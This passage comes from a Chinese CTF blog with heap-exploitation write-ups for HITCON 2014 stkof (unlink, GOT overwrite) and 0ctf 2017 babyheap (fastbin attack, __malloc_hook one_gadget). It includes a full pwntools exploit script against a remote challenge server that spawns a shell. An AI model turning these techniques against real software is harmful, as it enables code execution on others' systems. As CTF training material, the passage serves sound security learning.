title="思路分析"></a>思路分析</h2><ul><li>本题目没有后门函数，所以需要我们泄露libc</li><li>开启了PIE,且只有free,add,edit函数可以使用，正常的uaf通过unsortedbin泄露main_arena肯定不行了</li><li>但是我们还有一个unlink，以前都是修改free_got为sysem，现在我们可以将free_got修改为puts_plt，然后调用free就相当于puts_plt，将puts_got写入chunk中，就可以得到libc地址了。</li><li>然后就是正常的修改free_got为system_plt，写入&#x2F;bin&#x2F;sh，然后free就getshell了</li></ul><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h4 id="1-实现unlink"><a href="#1-实现unlink" class="headerlink" title="1.实现unlink"></a>1.实现unlink</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3合并,触发unlink</span></span><br></pre></td></tr></table></figure></div><ul><li>bss中0x0602140是add函数中s的地址，也是存储chunk的地址，但是之前也说了，我们是先+1再储存chunk地址的，因此chunk1对应于s[1],也就是0x0602140+0x8</li><li>unlink可以使当前储存chunk的地址指向target_addr-0x18，这样改的话会出现下面情况：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903214034468.bmp"></p><h4 id="2-修改free-got为puts-plt，泄露libc"><a href="#2-修改free-got为puts-plt，泄露libc" class="headerlink" title="2.修改free_got为puts_plt，泄露libc"></a>2.修改free_got为puts_plt，泄露libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li><font size="4"><strong>第一个payload:</strong></font></li></ul><p>修改chunk2，其实相当于修改 s-0x18地址的值，修改的是画框部分：</p><p>修改可以参考非栈上格式化字符串所说的A -&gt;B -&gt;C,修改A其实是修改C。</p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/1.bmp"></p><p>往下写0x10垃圾数据，然后填写free_got,puts_got，那么就会出现下面情况：</p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903214655504.bmp"></p><p><font size="4" color="red">这里一定要记住got@plt会自动的指向plt表，也就是说，修改got表到A-B这样的地址结构的时候，会形成A-&gt;GOT@plt-&gt;plt，这样三地址结构，所以我们再次修改A地址为plt才会成功。</font></p><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903215051485.bmp"></p><p>成功修改，然后free(2)，2处存储的是puts_plt的地址。</p><h4 id="3-修改free-got为system-然后getshell"><a href="#3-修改free-got为system-然后getshell" class="headerlink" title="3.修改free_got为system,然后getshell"></a>3.修改free_got为system,然后getshell</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>没什么说的，和之前一样的。</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903215311365.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_2017_babyheap--fastbin_attack</title>
      <link href="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/"/>
      <url>/2024/09/03/0ctf-2017-babyheap-fastbin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p><a class="link" href="https://buuoj.cn/challenges#0ctf_2017_babyheap">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so">libc.so文件链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ul><li><font coloe="red">glibc2.24 <strong>fastbin_attack</strong>, <strong>unsortedbin泄露main_arena</strong> ,<strong>Arbitrary Alloc</strong></font></li><li><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h2 id="题目速览："><a href="#题目速览：" class="headerlink" title="题目速览："></a>题目速览：</h2><ul><li><h5 id="典型的堆菜单题目，但是没有后门函数，system函数也没有"><a href="#典型的堆菜单题目，但是没有后门函数，system函数也没有" class="headerlink" title="典型的堆菜单题目，但是没有后门函数，system函数也没有"></a>典型的堆菜单题目，但是没有后门函数，system函数也没有</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134306228.bmp"></p><ul><li><h5 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134348584.bmp"></p><ul><li><h5 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134416635.bmp"></p><ul><li><h5 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134451923.bmp"></p><ul><li><h5 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134503547.bmp"></p><h3 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h3><ul><li><mark><strong>漏洞点在edit函数，未对size检查，可以实现任意地址写</strong><mark></mark></mark></li><li>题目开启了PIE,unlink直接out，由got表不可改，所以想到改__malloc_hook为onegadget</li><li>先通过unsortedbin泄露main_arena，即可以得到malloc_hook(相差0x10), arbitrary_alloc错位构造fake_chunk，就可以修改malloc_hook为one_gadget</li><li>但是运用arbitrary_alloc需要uaf修改fastbin中chunk的fd指针，因此需要我们两个地址控制同一个chunk，看下面调试吧。</li></ul><h2 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc2.24,泄漏libc,修改__malloc_hook为onegadget</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x00 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x20 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x40 2 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x60 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0x80 4 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fastbins 1-&gt;2</span></span><br></pre></td></tr></table></figure></div><ul><li>构造五个chunk，chunk0用来溢出chunk1，chunk1，2用于uaf，chunk4用来泄露libc，chunk3溢出修改chunk4</li><li>查看堆布局，看看如何使得两个地址共同控制一个chunk：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903162751498.bmp"></p><ul><li>由于内存的分页管理机制以及PIE，我们第一次分配堆地址的最后三位十六进制数肯定为000</li><li>此时我们溢出chunk0修改chunk1的fd指针，也就相当于修改chunk2的地址，此时我们需要利用chunk4,如果将1-&gt;fd所指向的chunk2的地址最后一字节修改为0x80，也就是1-&gt;fd &#x3D; chunk4。</li><li>同时由于add中会循环检查哪个指针&#x3D;0就将malloc的地址给到该指针，而chunk2的指针在free的时候被清零了，第二次malloc将chunk4给到了chunk2，因此chunk2会和chunk4联系起来，即<strong>修改chunk2也会修改chunk4</strong>，<strong>也就做到了uaf的利用</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  </span></span><br></pre></td></tr></table></figure></div><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>虽然已经将1-&gt;fd -&gt; 4 ,4和2联系起来了，但是此时的chunk4放在fastbin中肯定是不合适的，因为size不同，在分配chunk的时候size不同是会报错的，所以我们要修改chunk4的size，和chunk1保持一致(在同一个bin中)</li><li>然后将1，2都回收回来，注意虽然1-&gt;fd修改为了chunk4,但是add的函数中for循环从小到大，只要满足”标志位”是0就分配，而chunk2的标志位free之后始终为0。</li><li>然后将chunk4的size修改回来，free(4)，4的fd和bk指针将指向main_arena+0x58,show(2)就将输出这个特殊地址，因为chunk2和chunk4都是指向chunk4的。</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># 绕过fastbin检查</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 因为2的指针=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 防止和topchunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hook和main_arena差了0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903165642200.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>Arbitrary Alloc 构造fake_chunk</li></ul><p>技巧可以看开头的文章，这里直接演示。</p><ul><li>为了修改malloc_hook为one_gadget，我们要往malloc_hook上面构造fake_chunk，然后直接修改堆中内容即可，来看看malloc_hook上面又没有地方构造吧：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903170254157.bmp"></p><ul><li>我们发现这个地方可以错位出一个size出来，对应于fastbin[5]（不是很懂可以看开头文章)，这个错位出来的chunk的size是0x60(fastbin[5]对应的size就是0x60)，为了使fastbin中已经存在的chunk-&gt;fd链接上fake_chunk，其size也应该是0x60</li><li>该chunk的地址可以从图上看出：malloc_hook-0x13-0x8(size)-0x8(prev_size)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.23-0ubuntu11.2_amd64.so&quot;</span>)</span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 构造一个位于fastbin的chunk</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 修改chunk2=修改chunk4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6 -&gt; fake_chunk</span></span><br></pre></td></tr></table></figure></div><ul><li>下图可以发现修改chunk2其实也修改了chunk4</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903171316211.bmp"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><ul><li>然后就很简单了，修改malloc_hook-&gt;one_gadget，再次malloc即可。</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x13</span>) + p64(onegadget) <span class="comment"># 从上图看偏移即可</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>补充：要是用的buuctf给的libc-2.23.so的话，即使试便所有的onegadget也是不可以打通的，因为栈上的数据不满足，但是我们可以改__realloc_hook为onegadget，然后修改malloc_hook为realloc+n(n要自己试)</li><li>因为这个realloc附近存在大量的gadget可以调整栈结构，下面是脚本(与上面不同，这是后面重新写的):</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span></span><br><span class="line"><span class="comment">#libc = &#x27;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25292</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># overlapping</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 4</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload) <span class="comment"># 使得chunk4进入fastbin中</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># 绕过检查</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 4-2 因为free将2号chunk的指针记为0,但此时fastbin中的是chunk4，就将</span></span><br><span class="line"><span class="comment"># chunk4给了2号，所以此时2号和4号都指向4号chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改chunk4_size，leak libc</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 5 防止和top chunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">main_arena = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">lg(<span class="string">&quot;main_arena: &quot;</span>,main_arena)</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># 0x736c49fc4b10</span></span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 进入fastbin</span></span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span> <span class="comment"># Arbitary alloc</span></span><br><span class="line">fill(<span class="number">2</span>,p64(fake_chunk)) <span class="comment"># fastbin链接fake chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6 fake_chunk</span></span><br><span class="line">onegadget = libc.address + one[<span class="number">1</span>]</span><br><span class="line">payload = cyclic(<span class="number">0xb</span>)+p64(onegadget) + p64(realloc+<span class="number">10</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul><li><p>之前有几次出现了“timeout: the monitored command dumped core”</p></li><li><p>可以看看<a class="link" href="https://blog.csdn.net/Lcw_linyx/article/details/124311578">这篇文章 <i class="fa-regular 